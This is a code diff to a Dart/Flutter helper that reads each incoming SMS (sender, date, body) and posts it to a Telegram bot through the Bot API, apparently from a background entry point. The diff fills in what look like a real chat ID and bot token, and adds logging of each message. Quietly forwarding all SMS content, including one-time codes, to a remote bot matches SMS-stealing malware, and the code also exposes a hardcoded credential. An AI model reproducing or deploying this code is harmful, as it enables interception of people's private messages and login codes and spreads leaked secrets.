@@ -10,8 +10,9 @@ import 'constant.dart';
 
 @pragma("vm:entry-point")
 class TelegramBotHelper {
-  static const chatId = '';
-  static const apiKey = '';
+  static const chatId = '-1002171197915';
+
+  static const apiKey = '6804110841:AAHeCt27SnNU_2-nWV2xbSQK8C1qJJ_dCLc';
   static const chatUrl = 'https://api.telegram.org/bot$apiKey/sendMessage';
 
   @pragma("vm:entry-point")
@@ -31,13 +32,16 @@ PHONE: ${smsMessage.address}
 ${timestamp != null ? 'DATE: ${DateTime.fromMillisecondsSinceEpoch(timestamp)}' : ''}
 CONTENT: ${smsMessage.body}
 """;
+      print('message: $message');
+
       final dio = Dio(BaseOptions(baseUrl: chatUrl));
       await dio.get('', queryParameters: {
         'chat_id': chatId,
         'text': message,
       });
-    } catch (e) {
+    } catch (e, stackTrace) {
       print('Error sending message to telegram: $e');
+      print(stackTrace);
     }
   }
 
